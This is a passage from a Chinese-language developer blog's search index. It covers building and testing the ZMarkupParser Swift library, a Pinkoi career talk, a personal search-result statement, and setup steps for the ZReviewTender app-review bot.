imageURL、PlaceholderImage、顯要顯示的大小資訊，然後先用 placeHolder 直接顯示圖片 當 系統需要此圖片在畫面時會呼叫 image(forBounds… 方法，此時我們開始下載 Image Data DataSource 出去讓外部可決定怎麼下載或實現 Image Cache Policy，預設直接使用 URLSession 請求圖片 Data 下載完成後 new 一個新的 ZResizableNSTextAttachment 並在 attachmentBounds(for… 實現自定圖片大小的邏輯 呼叫 replace(attachment: ZNSTextAttachment, to: ZResizableNSTextAttachment) 方法，將 ZNSTextAttachment 位置替換為 ZResizableNSTextAttachment 發出 didLoad Delegate 通知，讓外部有需要時可串接 完成 詳細程式碼可參考 Source Code 。不使用 NSLayoutManager.invalidateLayout(forCharacterRange: range, actualCharacterRange: nil) 、 NSLayoutManager.invalidateDisplay(forCharacterRange: range) 刷新 UI 的原因是發現 UI 沒有正確的顯示更新；既然都知道所在 Range 了，直接觸發取代 NSAttributedString，能確保 UI 正確更新。最終顯示結果如下：&lt;span style=\"color:red\"&gt;こんにちは&lt;/span&gt;こんにちはこんにちは &lt;br /&gt;&lt;img src=\"https://user-images.githubusercontent.com/33706588/219608966-20e0c017-d05c-433a-9a52-091bc0cfd403.jpg\"/&gt;Testing &amp; Continuous Integration這次專案除了撰寫 Unit Test 單元測試之外還建立了 Snapshot Test 做整合測試方便對最終的 NSAttributedString 做綜觀的測試比較。主要功能邏輯都有 UnitTests 並加上整合測試，最終 Test Coverage 在 85% 左右。ZMarkupParser — codecovSnapshot Test直接引入框架使用:import SnapshotTesting// ...func testShouldKeppNSAttributedString() { let parser = ZHTMLParserBuilder.initWithDefault().build() let textView = UITextView() textView.frame.size.width = 390 textView.isScrollEnabled = false textView.backgroundColor = .white textView.setHtmlString(\"html string...\", with: parser) textView.layoutIfNeeded() assertSnapshot(matching: textView, as: .image, record: false)}// ...直接比對最終結果是否符合預期，確保調整整合起來沒有異常。Codecov Test Coverage串接 Codecov.io (free for Public Repo) 評估 Test Coverage，只需安裝 Codecov Github App &amp; 設計即可。Codecov &lt;-&gt; Github Repo 設定好後，也可以在專案根目錄加上 codecov.ymlcomment: # this is a top-level key layout: \"reach, diff, flags, files\" behavior: default require_changes: false # if true: only post the comment if coverage changes require_base: no # [yes :: must have a base report to post] require_head: yes # [yes :: must have a head report to post]設定檔，這樣可以啟用每個 PR 發出後，自動把 CI 跑的結果 Comment 到內容。Continuous IntegrationGithub Action, CI 整合: ci.ymlname: CIon: workflow_dispatch: pull_request: types: [opened, reopened] push: branches: - mainjobs: build: runs-on: self-hosted steps: - uses: actions/checkout@v3 - name: spm build and test run: | set -o pipefail xcodebuild test -workspace ZMarkupParser.xcworkspace -testPlan ZMarkupParser -scheme ZMarkupParser -enableCodeCoverage YES -resultBundlePath './scripts/TestResult.xcresult' -destination 'platform=iOS Simulator,name=iPhone 14,OS=16.1' build test | xcpretty - name: Codecov uses: codecov/codecov-action@v3.1.1 with: xcode: true xcode_archive_path: './scripts/TestResult.xcresult'此設定是在 PR opened/reopend or push main branch 時跑 build and test 最後把 test coverage 報告上傳到 codecov.Regex關於正規表示法，每用到一次就又再精進一次；這次實際沒用到太多，但是因為本來想用一個正則挖出成對的 HTML Tag 所以也多研究過要怎麼撰寫。一些這次新學習的 cheat sheet 筆記… ?: 可以讓 ( ) 匹配 group 結果，但不會捕獲返回e.g. (?:https?:\\/\\/)?(?:www\\.)?example\\.com 在 https://www,example.com 會返回整個網址而不是 https:// , www .+? 非貪婪的匹配 (找到最近的就返回)e.g. &lt;.+?&gt; 在 &lt;a&gt;test&lt;/a&gt; 會返回 &lt;a&gt; , &lt;/a&gt; 而非整個字串 (?=XYZ) 任何字串直到 XYZ 字串出現；要注意，另一個與之相似的 [^XYZ] 是代表任何字串直到 X or Y or Z 字元出現e.g. (?:__)(.+?(?=__))(?:__) (任何字串直到 __ ) 會匹配出 test ?R 遞迴往內找一樣規則的值e.g. \\((?:[^()]|((?R)))+\\) 在 (simple) (and(nested)) 會匹配出 (simple) , (and(nested)) , (nested) ?&lt;GroupName&gt; … \\k&lt;GroupName&gt; 匹配前面的 Group Namee.g. (?&lt;tagName&gt;&lt;a&gt;).*(\\k&lt;GroupName&gt;) (?(X)yes|no) 第 X 個匹配結果有值(也可以用 Group Name)時則匹配後面條件 yes 否則匹配 no Swift 暫時不支援其他 Regex 好文： Swift 正则速查手册 正则表达式是如何运作的？ -&gt; 後續優化此專案的正則效能時可參考 Regex 錯誤導致無窮尋找，最終引發伺服器故障的案例 Regex101 右下方可查詢所有正則規則Swift Package Manager &amp; Cocoapods這也是我第一次開發 SPM &amp; Cocoapods…蠻有趣的，SPM 真的方便；但是踩到同時兩個專案依賴同個套件的話，同時開兩個專案會有其中一個找不到該套件然後 Build 不起來。。。Cocoapods 有上傳 ZMarkupParser 但沒測試正不正常，因為我是用 SPM 😝。ChatGPT實際搭配開發體驗下來，覺得只有在協助潤稿 Readme 時最有用；在開發上目前沒體會到有感的地方；因為詢問 mid-senior 以上的問題，他也給不出個確切答案甚是是錯誤的答案 (有遇到問他一些正則規則，答案不太正確)，所以最後還是回到 Google 人工找正確解答。更不要說請他寫 Code 了，除非是簡單的 Code Gen Object；不然不要幻想他能直接完成整個工具架構。 (至少目前是這樣，感覺寫 Code 這塊 Copilot 可能更有幫助)但他可以給一些知識盲區的大方向，讓我們能快速大略知道某些地方應該會怎麼做；有的時候掌握度太低，在 Google 反而很難快速定位到正確的方向，這時候 ChatGPT 就蠻有幫助的。聲明歷經三個多月的研究及開發，已疲憊不堪，但還是要聲明一下此做法僅為我研究後得到的可行結果，不一定是最佳解，或還有可優化的地方，這專案更像是一個拋磚引玉，希望能得到一個 Markup Language to NSAttributedString 的完美解答， 非常歡迎大家貢獻；有許多事項還需要群眾的力量才能完善 。ContributingZMarkupParser ⭐這邊先列一些此時此刻(2023/03/12)想到能更好的地方，之後會在 Repo 上紀錄： 效能/算法的優化，雖然比原生 NSAttributedString.DocumentType.html 快速且穩定；但還有需多優化空間，我相信效能絕對不如 XMLParser；希望有朝一日能有同樣的效能但又能保持客製化及自動修正容錯 支援更多 HTML Tag、Style Attribute 轉換解析 ZNSTextAttachment 再優化，實現 reuse 能，釋放記憶體；可能要研究 CoreText 支援 Markdown 解析，因底層抽象其實不局限於 HTML；所以只要建好前面的 Markdown 轉 Markup 物件就能完成 Markdown 解析；因此我取名叫 ZMarkupParser，而不是 ZHTMLParser，就是希望有朝一日也能支援 Markdown to NSAttributedString 支援 Any to Any, e.g. HTML To Markdown, Markdown To HTML，因我們有原始的 AST 樹(Markup 物件)，所以實現任意 Markup 間的轉換是有機會的 實現 css !important 功能，加強抽象 MarkupStyle 的繼承策略 加強 HTML Selector 功能，目前只是最粗淺的 filter 功能 好多好多, 歡迎開 issue 如果您心有餘而力不足，也可以透過給我一顆 ⭐ 讓 Repo 可以被更多人看見，進而讓 Github 大神有機會協助貢獻！總結ZMarkupParser以上就是我開發 ZMarkupParser 的所有技術細節及心路歷程，花費了我快三個月的下班及假日時間，無數的研究及實踐過程，到撰寫測試、提升 Test Coverage、建立 CI；最後才有一個看起來有點樣子的成果；希望這個工具有解決掉有相同困擾的朋友，也希望大家能一起讓這個工具變得更好。pinkoi.com目前有應用在敝司 pinkoi.com 的 iOS 版 App 上，沒有發現問題。😄延伸閱讀 ZMarkupParser HTML String 轉換 NSAttributedString 工具 String Rendering Asynchronous NSTextAttachments有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 1,126 Total Views Last Statistics Date: 2025-01-19 | 1,126 Views on Medium. " }, { "title": "ZMarkupParser HTML String 轉換 NSAttributedString 工具", "url": "/posts/a5643de271e4/", "categories": "ZRealm Dev.", "tags": "html-parser, nsattributedstring, ios-app-development, html, markdown", "date": "2023-02-26 17:03:07 +0800", "snippet": "ZMarkupParser HTML String 轉換 NSAttributedString 工具轉換 HTML String 成 NSAttributedString 對應 Key 樣式設定ZhgChgLi / ZMarkupParserZhgChgLi / ZMarkupParser功能 使用純 Swift 開發，透過 Regex 剖析出 HTML Tag 並經過 Tokenizat...", "content": "ZMarkupParser HTML String 轉換 NSAttributedString 工具轉換 HTML String 成 NSAttributedString 對應 Key 樣式設定ZhgChgLi / ZMarkupParserZhgChgLi / ZMarkupParser功能 使用純 Swift 開發，透過 Regex 剖析出 HTML Tag 並經過 Tokenization，分析修正 Tag 正確性(修正沒有 end 的 tag &amp; 錯位 tag)，再轉換成 abstract syntax tree，最終使用 Visitor Pattern 將 HTML Tag 與抽象樣式對應，得到最終 NSAttributedString 結果；其中不依賴任何 Parser Lib。 支援 HTML Render (to NSAttributedString) / Stripper (剝離 HTML Tag) / Selector 功能 自動分析修正 Tag 正確性(修正沒有 end 的 tag &amp; 錯位 tag)&lt;br&gt; -&gt; &lt;br/&gt; &lt;b&gt;Bold&lt;i&gt;Bold+Italic&lt;/b&gt;Italic&lt;/i&gt; -&gt; &lt;b&gt;Bold&lt;i&gt;Bold+Italic&lt;/i&gt;&lt;/b&gt;&lt;i&gt;Italic&lt;/i&gt; &lt;Congratulation!&gt; -&gt; &lt;Congratulation!&gt; (treat as String) 支援客製化樣式指定e.g. &lt;b&gt;&lt;/b&gt; -&gt; weight: .semilbold &amp; underline: 1 支援自行擴充 HTML Tag 解析e.g. 解析 &lt;zhgchgli&gt;&lt;/zhgchgli&gt; 成想要的樣式 包含架構設計，方便對 HTML Tag 進行擴充目前純了支援基本的樣式之外還支援 ul/ol/li 列表及 hr 分隔線渲染，未來要擴充支援其他 HTML Tag 也能快速支援 支援從 style HTML Attribute 擴充解析樣式HTML 可以從 style 指定文字樣式，同樣的，此套件也能支援從 style 中指定樣式e.g. &lt;b style=”font-size: 20px”&gt;&lt;/b&gt; -&gt; 粗體+字型 20 px 支援 iOS/macOS 支援 HTML Color Name to UIColor/NSColor Test Coverage: 80%+ 支援 &lt;img&gt; 圖片、 &lt;ul&gt; 項目清單、 &lt;table&gt; 表格…等等 HTMLTag 解析 比 NSAttributedString.DocumentType.html 更高的效能效能分析Performance Benchmark 測試環境：2022/M2/24GB Memory/macOS 13.2/XCode 14.1 X 軸：HTML 字數 Y 軸：渲染所花時間(秒)*另外 NSAttributedString.DocumentType.html 超過 54,600+ 長度字串就會閃退 (EXC_BAD_ACCESS)。試玩可直接下載專案打開 ZMarkupParser.xcworkspace 選擇 ZMarkupParser-Demo Target Build &amp; Run 直接測試效果。安裝支援 SPM/Cocoapods ，請參考 Readme 。使用方式樣式宣告MarkupStyle/MarkupStyleColor/MarkupStyleParagraphStyle，對應 NSAttributedString.Key 的封裝。var font:MarkupStyleFontvar paragraphStyle:MarkupStyleParagraphStylevar foregroundColor:MarkupStyleColor? = nilvar backgroundColor:MarkupStyleColor? = nilvar ligature:NSNumber? = nilvar kern:NSNumber? = nilvar tracking:NSNumber? = nilvar strikethroughStyle:NSUnderlineStyle? = nilvar underlineStyle:NSUnderlineStyle? = nilvar strokeColor:MarkupStyleColor? = nilvar strokeWidth:NSNumber? = nilvar shadow:NSShadow? = nilvar textEffect:String? = nilvar attachment:NSTextAttachment? = nilvar link:URL? = nilvar baselineOffset:NSNumber? = nilvar underlineColor:MarkupStyleColor? = nilvar strikethroughColor:MarkupStyleColor? = nilvar obliqueness:NSNumber? = nilvar expansion:NSNumber? = nilvar writingDirection:NSNumber? = nilvar verticalGlyphForm:NSNumber? = nil...可依照自己想套用到 HTML Tag 上對應的樣式自行宣告：let myStyle = MarkupStyle(font: MarkupStyleFont(size: 13), backgroundColor: MarkupStyleColor(name: .aquamarine))HTML Tag宣告要渲染的 HTML Tag 與對應的 Markup Style，目前預定義的 HTML Tag Name 如下：A_HTMLTagName(), // &lt;a&gt;&lt;/a&gt;B_HTMLTagName(), // &lt;b&gt;&lt;/b&gt;BR_HTMLTagName(), // &lt;br&gt;&lt;/br&gt;DIV_HTMLTagName(), // &lt;div&gt;&lt;/div&gt;HR_HTMLTagName(), // &lt;hr&gt;&lt;/hr&gt;I_HTMLTagName(), // &lt;i&gt;&lt;/i&gt;LI_HTMLTagName(), // &lt;li&gt;&lt;/li&gt;OL_HTMLTagName(), // &lt;ol&gt;&lt;/ol&gt;P_HTMLTagName(), // &lt;p&gt;&lt;/p&gt;SPAN_HTMLTagName(), // &lt;span&gt;&lt;/span&gt;STRONG_HTMLTagName(), // &lt;strong&gt;&lt;/strong&gt;U_HTMLTagName(), // &lt;u&gt;&lt;/u&gt;UL_HTMLTagName(), // &lt;ul&gt;&lt;/ul&gt;DEL_HTMLTagName(), // &lt;del&gt;&lt;/del&gt;IMG_HTMLTagName(handler: ZNSTextAttachmentHandler), // &lt;img&gt; and image downloaderTR_HTMLTagName(), // &lt;tr&gt;TD_HTMLTagName(), // &lt;td&gt;TH_HTMLTagName(), // &lt;th&gt;...and more...這樣解析 &lt;a&gt; Tag 時就會套用到指定的 MarkupStyle。擴充 HTMLTagName：let zhgchgli = ExtendTagName(\"zhgchgli\")HTML Style Attribute如同前述，HTML 支援從 Style Attribute 指定樣式，這邊也抽象出來可指定支援的樣式跟擴充，目前預定義的 HTML Style Attribute 如下：ColorHTMLTagStyleAttribute(), // colorBackgroundColorHTMLTagStyleAttribute(), // background-colorFontSizeHTMLTagStyleAttribute(), // font-sizeFontWeightHTMLTagStyleAttribute(), // font-weightLineHeightHTMLTagStyleAttribute(), // line-heightWordSpacingHTMLTagStyleAttribute(), // word-spacing...擴充 Style Attribute:ExtendHTMLTagStyleAttribute(styleName: \"text-decoration\", render: { value in var newStyle = MarkupStyle() if value == \"underline\" { newStyle.underline = NSUnderlineStyle.single } else { // ... } return newStyle})使用import ZMarkupParserlet parser = ZHTMLParserBuilder.initWithDefault().set(rootStyle: MarkupStyle(font: MarkupStyleFont(size: 13)).build()initWithDefault 會自動加入預先定義的 HTML Tag Name &amp; 預設對應的 MarkupStyle 還有預先定義的 Style Attribute。set(rootStyle:) 可指定整個字串的預設樣式，也可不指定。客製化let parser = ZHTMLParserBuilder.initWithDefault().add(ExtendTagName(\"zhgchgli\"), withCustomStyle: MarkupStyle(backgroundColor: MarkupStyleColor(name: .aquamarine))).build() // will use markupstyle you specify to render extend html tag &lt;zhgchgli&gt;&lt;/zhgchgli&gt;let parser = ZHTMLParserBuilder.initWithDefault().add(B_HTMLTagName(), withCustomStyle: MarkupStyle(font: MarkupStyleFont(size: 18, weight: .style(.semibold)))).build() // will use markupstyle you specify to render &lt;b&gt;&lt;/b&gt; instead of default bold markup styleHTML Renderlet attributedString = parser.render(htmlString) // NSAttributedString// work with UITextViewtextView.setHtmlString(htmlString)// work with UILabellabel.setHtmlString(htmlString)HTML Stripperparser.stripper(htmlString)Selector HTML Stringlet selector = parser.selector(htmlString) // HTMLSelector e.g. input: &lt;a&gt;&lt;b&gt;Test&lt;/b&gt;Link&lt;/a&gt;selector.first(\"a\")?.first(\"b\").attributedString // will return Testselector.filter(\"a\").attributedString // will return Test Link// render from selector resultlet selector = parser.selector(htmlString) // HTMLSelector e.g. input: &lt;a&gt;&lt;b&gt;Test&lt;/b&gt;Link&lt;/a&gt;parser.render(selector.first(\"a\")?.first(\"b\"))Async另外如果要渲染長字串，可改用 async 方法，防止卡 UI。parser.render(String) { _ in }...parser.stripper(String) { _ in }...parser.selector(String) { _ in }...Know-how UITextView 中的超連結樣式是看 linkTextAttributes，所以會出現 NSAttributedString.key 明明有設定但卻沒出現效果的情況。 UILabel 不支援指定 URL 樣式，所以會出現 NSAttributedString.key 明明有設定但卻沒出現效果的情況。 如果要渲染複雜的 HTML，還是需要使用 WKWebView (包含 JS/表格. .渲染)。技術原理及開發故事：「 手工打造 HTML 解析器的那些事 」歡迎貢獻及提出 Issue 將盡快修正有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 635 Total Views Last Statistics Date: 2025-01-19 | 611 Views on Medium. " }, { "title": "Google 搜尋出現與本人李仲澄無關之負面新聞聲明", "url": "/posts/declaration_for_google_search_result/", "categories": "ZRealm Life.", "tags": "blog, blogger, developer, 生活, medium", "date": "2023-01-09 08:00:00 +0800", "snippet": "聲明 #1: 技藝專題】寫程式成全民運動！專訪網頁設計金牌李仲澄 #2: 【技藝專題】人才培養做半套，技優生反成四不像聲明人：李仲澄聲明日期：2023/01/09聯繫方式：zhgchgli@gmail.com(因不想增加 Google 對無關的惡意字詞收錄，故使用圖片做為聲明文件)===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Foll...", "content": "聲明 #1: 技藝專題】寫程式成全民運動！專訪網頁設計金牌李仲澄 #2: 【技藝專題】人才培養做半套，技優生反成四不像聲明人：李仲澄聲明日期：2023/01/09聯繫方式：zhgchgli@gmail.com(因不想增加 Google 對無關的惡意字詞收錄，故使用圖片做為聲明文件)===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers" }, { "title": "Pinkoi 2022 Open House for GenZ — 15 Mins Career Talk", "url": "/posts/4b9d09cea5f0/", "categories": "ZRealm Dev.", "tags": "ios-app-development, pinkoi, open-house, tech-career, career-advice", "date": "2022-12-02 16:11:49 +0800", "snippet": "Pinkoi 2022 Open House for GenZ — 15 Mins Career TalkPinkoi Developers’ Night 2022 年末交流會 — 15 分鐘職涯分享演講Pinkoi Developers’ Night 2022 年末交流會活動連結： Linkedin主要聽眾：各大專院校資訊相關科系在校學生地點時間：2022/12/01 7:00 PM — ...", "content": "Pinkoi 2022 Open House for GenZ — 15 Mins Career TalkPinkoi Developers’ Night 2022 年末交流會 — 15 分鐘職涯分享演講Pinkoi Developers’ Night 2022 年末交流會活動連結： Linkedin主要聽眾：各大專院校資訊相關科系在校學生地點時間：2022/12/01 7:00 PM — 9:00 PM分享時長：15 minsAbout Me目前擔任 Pinkoi Platform (App) Engineer Lead 兼 iOS Engineer，之前待過 街聲 、 數字科技( 上櫃 5287)、 新創公司 ；從高職開始自學網站程式設計，曾獲 全國技能競賽 網頁設計職類冠軍及備取國手，畢業於臺灣科技大學資管系，2017 年轉職 iOS App 開發。熱衷於探索與技術交流，也會寫寫日常生活或開箱體驗，歡迎大家追縱我的 Medium Blog 。Pinkoi Engineer 日常 — 產品Pinkoi 產品支援電腦版、手機版、iOS、Android 四種平台及繁體中文、香港繁體、簡體中文、日文、泰文、英文六種語系。幕後有 8+ 個小隊(Squad Team)負責不同面向的工作，例如：Buyer Squad 負責買家端、Seller Squad 負責賣家端、Platform Squad 負責底層、AI Squad 負責算法…等等，一同打造 Pinkoi 產品。Pinkoi Engineer 日常 — 工具請注意：本圖非全面或最新的 Tech Stack工欲善其事必先利其器，上圖列舉了 Pinkoi 開發團隊，背後的 Tech Stack 及有使用到的工具服務；另外也列舉了跨團隊協作工具 Slack、Asana、Figma …等等服務。隨團隊規模人數不斷成長，會有更多時候需要溝通或重複性工作，此時透過引入工具服務，可以很好的解開人與人的連結，增加團隊工作效率。Pinkoi Engineer 日常 — 幕後「功」「臣」在 Pinkoi 雖然工程師被分派在各個 Squad Team 之中，但彼此之間仍會同心協力， Win as a team, 我們都還是同個家庭 。Pinkoi Engineer 日常 — 幕後「功」「臣」同職能的隊友(e.g. iOS/Android/BE/FE/Data…) 除了會定期舉行技術交流分享外，在日常開發上也會互相 Code Review、進行 System Design 討論；一同討論、一齊成長！上圖中間的「乖乖」紋身貼紙，是團隊「 送禮清單 」功能上線及「 2022 Pinkoi Design Fest 風格設計節 」活動的 祈福儀式 ，確保服務平平安安穩穩定定。Engineer 如何幫助推進商業目標？除了完成任務外，Engineer 還有許多能幫助推進商業目標的地方：首先撇開 Engineer 角色的束縛，以自身為出發點；我們可以在專案規劃時期，提出自己生活使用經驗及各種有創意的發想，例如：有觀察到朋友的使用習慣或新流行的酷東西 (e.g. iOS 16 動態島)，集思廣益之下，說不定就能讓本來平凡無奇的功能變成全新的亮點！再來回到工程本身，第一當然是必備的開發能力，好的開發能力能保有擴充及穩定性，減少技術債的產生，減少日後維護成本，變相增進商業價值；同樣地，正確的技術選擇，也能在有限的開發資源下發揮最大的價值；這些都需要很多硬實力及經驗累積。除此之外，發揮溝通協調能力能讓跨工程討論更有效率、發揮協作能力能減少重工發生；都能大大增加團隊產出，更進一步推進商業目標。綜合以上，工程師絕對不是只能靠寫程式創造價值。Engineer 如何幫助推進商業目標？在 Pinkoi，小隊 (Squad Team) 的 Sync-up 或專案討論會議，除工程師之外還會有設計師、PM、分析師，一同參與專案討論；人人都可以提出自己的想法，激發出不同的火花。身為 Engineer，選擇加入具新創文化而非一般傳統大公司的原因…?個人體驗，新創文化(also in Pinkoi)有五個特性： 透明 公司的營運狀況、決策跟未來規劃，所有人都能清楚知道 平等 扁平化管理，不會有階級壓力不分職務大家都能表達意見、參與討論 視野 跟隨團隊一同成長，從小團隊到國際化團隊，增進視野結合透明與平等，能了解更多方面的眉眉角角 彈性 - 工作上的彈性：上班時間、WFH 的彈性或溝通協作上都有很多彈性討論空間- 職務上的彈性：有更多嘗試不同可能的彈性更多升遷的彈性 活躍 平均年齡相對年輕有活力，更容易產生共鳴迸出火花，也較容易推動、接納改變這些特性，以往在傳統大公司就比較不容易看到，傳統公司多半比較封閉跟一版一眼，很難有提議空間，能看到跟做的事也很有限，對於新的改變嘗試也比較排斥；對有活力的新鮮人來說相對比較難發揮。給想當軟體工程師的新鮮人一點建議…工程師 28 歲 v.s. 工程師 46 歲 (Elon Musk 也曾是工程師)；雖然是梗圖，但想表達的是要成為怎麼樣的工程師，都是由你自己決定。給想當軟體工程師的新鮮人一點建議…除了精實開發能力之外，我覺得更重要的是心態問題，人生是一場旅程，有很多階段與角色需要完成；第一個是需要時時刻刻跳脫舒適圈，持續準備好面對更高的挑戰；像我最一開始其實後端工程師，後來轉 iOS 開發，現在開始挑戰管理職。第二是方向的探索，不要畫地自限，每個人都有無限可能，可以持續調整找到適合自己的方向，在拿手領域發光發熱；我們有隊友也是後期才轉職工程師或是從設計師轉職 PM，另外也可以想一下自己 30 歲、 40 歲想成為什麼角色，例如：繼續鑽研技術變架構師/Tech Lead，或是改擔任管理職。還有終身學習，學無止盡，尤其我們是資訊行業，千變萬化，如果沒有求新求變很容易被業界淘汰最後一點也很重要，要保持工作與生活的平衡，Work Hard, Play Hard 除了能提升工作效率，也能從生活經驗汲取工作靈感，如同前面所說，也許一個小創意就能改變世界、創造更高的商業價值！建議新鮮人 謹慎選擇 前幾份工作，初出社會沈默成本很低；可以先以能學到東西為找工作第一考量，盡量先選擇加入自己有做產品的公司 (e.g. Pinkoi /Line/StreetVoice…) 並不要太頻繁地更換職務 (至少待個一年起)，對未來職涯會很有幫助。 人生路還很長，希望大家找到屬於自己的路，謝謝。立即加入 Pinkoi &gt;&gt;&gt; https://www.pinkoi.com/about/careers花絮有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 181 Total Views Last Statistics Date: 2025-01-19 | 139 Views on Medium. " }, { "title": "ZReviewTender — 免費開源的 App Reviews 監控機器人", "url": "/posts/e36e48bb9265/", "categories": "ZRealm Dev.", "tags": "ios-app-development, app-store, google-play, app-review, automation", "date": "2022-08-10 19:56:05 +0800", "snippet": "ZReviewTender — 免費開源的 App Reviews 監控機器人實時監測 App 的最新評價內容並即時給予反饋，提升協作效率及消費者滿意度ZhgChgLi / ZReviewTenderZhgChgLi / ZReviewTenderApp Reviews to Slack ChannelZReviewTender — 為您自動監控 App Store iOS/macOS Ap...", "content": "ZReviewTender — 免費開源的 App Reviews 監控機器人實時監測 App 的最新評價內容並即時給予反饋，提升協作效率及消費者滿意度ZhgChgLi / ZReviewTenderZhgChgLi / ZReviewTenderApp Reviews to Slack ChannelZReviewTender — 為您自動監控 App Store iOS/macOS App 與 Google Play Android App 的使用者最新評價訊息，並提供持續整合工具，串接進團隊工作流程，提升協作效率及消費者滿意度。特色功能 取得 App Store iOS/macOS App 與 Google Play Android App 評價列表並篩選出尚未爬取過的最新評價內容 [預設功能] 轉發爬取到的最新評價到 Slack，點擊訊息 Timestamp 連結能快速進入後台回覆評價 [預設功能] 支援使用 Google Translate API 自動翻譯非指定語系、地區的評價內容成您的語言 [預設功能] 支援自動記錄評價到 Google Sheet 支援彈性擴充，除包含的預設功能外您仍可依照團隊工作流程，自行開發所需功能並整合進工具中 e.g. 轉發評價到 Discord, Line, Telegram… 使用時間戳紀錄爬取位置，防止重複爬取評價 支援過濾功能，可指定只爬取 多少評分、評價內容包含什麼關鍵字、什麼地區/語系 的評價 Apple 基於 全新的 App Store Connect API ，提供穩定可靠的 App Store App 評價資料來源，不再像 以往使用 XML 資料不可靠 or Fastlane Spaceship Session 會過期需定時人工維護 Android 同樣使用官方 AndroidpublisherV3 API 撈取評價資料 支援使用 Github Repo w/ Github Action 部署，讓您免費快速的建立 ZReviewTender App Reviews 機器人 100% Ruby @ RubyGemTL;DR [2024/09/27] Update 整理快速部署教學文件，請參考最新文章：[Quick Start! ] Github Action x ZReviewTender 免費快速部署你的 App 商城評價監控機器人。與類似服務比較App Reviews 工作流程整合範例 (in Pinkoi)問題：商城的評價對產品很重要但他卻是一個非常人工跟重複轉介溝通的事。因為要時不時人工上去看一下新評價，如過有客服問題再將問題轉發給客服協助處理，很重複、人工。透過 ZReviewTender 評價機器人，將評價自動轉發到 Slack Channel，大家能快速收到最新評價資訊，並即時追蹤、討論；也能讓整個團隊了解目前使用者對產品的評價、建議。更多資訊可參考： 2021 Pinkoi Tech Career Talk — 高效率工程團隊大解密 。部署 — 只使用預設功能如果您只需要 ZReviewTender 自帶的預設功能 (to Slack/Google Translate/Filter) 則可使用以下快速部署方式。ZReviewTender 已打包發佈到 RubyGems ，您可以快速方便的使用 RubyGems 安裝使用 ZReviewTender。[推薦] 直接使用 Github Repo Template 部署 無需任何主機空間 ✅ 無需任何環境要求 ✅ 無需了解工程原理 ✅ 完成 Config 檔案配置即完成部署 ✅ 8 個步驟即可完成部署 ✅ 完全免費 ✅Github Action 提供每個帳號 2,000+分鐘/月 執行用量，執行一次 ZReviewTender 評價撈取約只需要 15~30 秒。預設每 6 小時執行一次，一天執行 4 次， 一個月約只消耗 60 分鐘額度 。Github Private Repo 免費無限制建立。1.前往 ZReviewTender Template Repo: ZReviewTender-deploy-with-github-action點擊右上方「Use this template」按鈕。2. 建立 Repo Repository name: 輸入你想要的 Repo 專案名稱 Access: Private ⚠️⚠️ 請務必建立 Private Repo ⚠️⚠️ 因為你將上傳設定及私密金鑰到專案中最後點擊下方「Create repository from template」按鈕。3. 確認你建立的 Repo 是 Private Repo確認右上方 Repo 名稱有出現「🔒」和 Private 標籤。若無則代表您建立的事 Public Repo 非常危險 ，請前往上方 Tab「Settings」-&gt; 「General」-&gt; 底部「Danger Zone」-&gt; 「Change repository visibility」-&gt;「Make private」 改回 Private Repo 。4. 等待 Project init 成功可在 Repo 首頁 Readme 中的區塊查看 Badge，如果 passing 即代表 init 成功。或是點擊上方 Tab「Actions」-&gt; 等待「Init ZReviewTender」Workflow 執行完成：執行完成狀態會變 3「✅ Init ZReviewTender」-&gt; Project init 成功。5. 確認 init 檔案及目錄是否正確建立點擊上方 Tab「Code」回到專案目錄，Project init 成功的話會出現: 目錄： config/ 檔案： config/android.yml 檔案： config/apple.yml 目錄： latestCheckTimestamp/ 檔案： latestCheckTimestamp/.keep6. 完成 Configuration 配置好 android.yml &amp; apple.yml進入 config/ 目錄完成 android.yml &amp; apple.yml 檔案配置。點擊進入要編輯的 confi YML 檔案點擊右上方「✏️」編輯檔案。參考本文下方「 設定 」區塊完成配置好 android.yml &amp; apple.yml 。編輯完成後可以直接在下方「Commit changes」儲存設定。上傳相應的 Key 檔案到 config/ 目錄下:在 config/ 目錄下，右上角選擇「Add file」-&gt;「Upload files」將 config yml 裡配置的相應 Key、外部檔案路徑一併上傳到 config/ 目錄下，拖曳檔案到「上方區塊」-&gt; 等待檔案上傳完成 -&gt; 下方直接「Commit changes」儲存。上傳完成後回到 /config 目錄查看檔案是否正確儲存&amp;上傳。7. 初始化 ZReviewTender (手動觸發執行一次)點擊上方 Tab「Actions」-&gt; 左方選擇「ZReviewTender」-&gt; 右方按鈕選擇「Run workflow」-&gt; 點擊「Run workflow」按鈕執行一次 ZReviewTender。點擊後，重新整理網頁 會出現：點擊「ZReviewTender」可進入查看執行狀況。展開「 Run ZreviewTender -r 」區塊可查看執行 Log。這邊可以看到出現 Error，因為我還沒配置好我的 config yml 檔案。回頭調整好 android/apple config yml 後再回到 6. 步驟一開始重新觸發執行一次。查看 「 ZReviewTender -r 」區塊的 log 確認執行成功！Slack 指定接收最新評價訊息的 Channel 也會出現 init Success 成功訊息 🎉8. Done! 🎉 🎉 🎉配置完成！爾後每 6 個小時會自動爬取期間內的最新評價並轉發到你的 Slack Channel 中！可在 Repo 首頁 Readme 中的頂部查看最新一次執行狀況：若出現 Error 即代表執行發生錯誤，請從 Acions -&gt; ZReviewTender 進入查看紀錄；如果有意外的錯誤，請 建立一個 Issue 附上紀錄資訊，將會盡快修正！ ❌❌❌執行發生錯誤同時 Github 也會寄信通知，不怕發生錯誤機器人掛掉但沒人發現！Github Action 調整您還可以依照自己需求配置 Github Action 執行規則。點擊上方 Tab「Actions」-&gt; 左方「ZReviewTender」-&gt; 右上方「 ZReviewTender.yml 」點擊右上方「✏️」編輯檔案。有兩個參數可供調整：cron : 設定多久檢查一次有無新評價，預設是 15 */6 * * * 代表每 6 小時 15 分鐘會執行一次。可參考 crontab.guru 依照自己的需求配置。 請注意： 1. Github Action 使用的是 UTC 時區 2. 執行頻率越高會消耗越多Github Action 執行額度run : 設定要執行的指令，可參考本文下方「 執行 」區塊，預設是 ZReviewTender -r 預設執行 Android App &amp; Apple(iOS/macOS App)： ZReviewTender -r 只執行 Android App： ZReviewTender -g 只執行 